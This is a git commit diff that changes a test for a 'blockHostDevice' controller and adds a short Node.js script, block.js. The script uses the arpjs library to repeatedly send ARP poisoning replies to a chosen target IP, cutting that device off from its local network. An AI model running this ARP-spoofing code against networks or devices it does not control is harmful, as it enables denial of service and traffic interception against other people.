e9539ea405575628a04efff08e37f842b7f01e79
Nathan Fain <cyphunk@gmail.com>
2021-02-26 12:36:10 +0100

    block host testing

--- server/controller/blockHostDevice/blockHostDevice-test.js
+++ server/controller/blockHostDevice/blockHostDevice-test.js
@@ -2,12 +2,14 @@ const blockHostDevice = require('./blockHostDevice');
 
 let fakeevent = {}
 let arguments = {
-  networkinterface: "wlan0",
-  gatewayip:        "192.168.0.1", //my router
-  targetip:         "192.168.0.20" //my phone
+  // networkinterface: "wlan0",
+  // gatewayip:        "192.168.178.1", //my router
+  // targetip:         "192.168.178.61", //my phone
+  ournetworkOption: '"wlan0-aaaTHISISIGNOREDaaa"',
+  hostIP: "192.168.178.61", // my phone
 }
-blockHostDevice(fakeevent, arguments)
+blockHostDevice(fakeevent, arguments).then(console.log)
 setInterval(()=>{
-  blockHostDevice(fakeevent, arguments)
+  blockHostDevice(fakeevent, arguments).then(console.log)
 },4000)
 
---
+++ src/block.js
@@ -0,0 +1,27 @@
+const arp = require('arpjs');
+
+
+if (process.argv.length < 6) {
+  console.error('interface targetip gatewayip intervalms')
+  process.exit(1);
+}
+const interface  = process.argv[2];
+const targetip   = process.argv[3];
+const gatewayip  = process.argv[4]; // should be OUR/workstation IP 
+                                    // tell target gateway is me
+const intervalms = process.argv[5];
+
+console.log(process.argv)
+
+arp.setInterface(interface);
+
+function block(targetip, gatewayip){
+  process.stdout.write('.')
+  arp.poison(targetip, gatewayip);
+  // Tells targetip that I am gatewayip, a.k.a. Sends a gratuitous ARP Reply to targetip telling that the MAC Address of gatewayip is its own MAC.
+}
+
+h = setInterval(()=>{
+  block(targetip, gatewayip)
+}, intervalms);
+
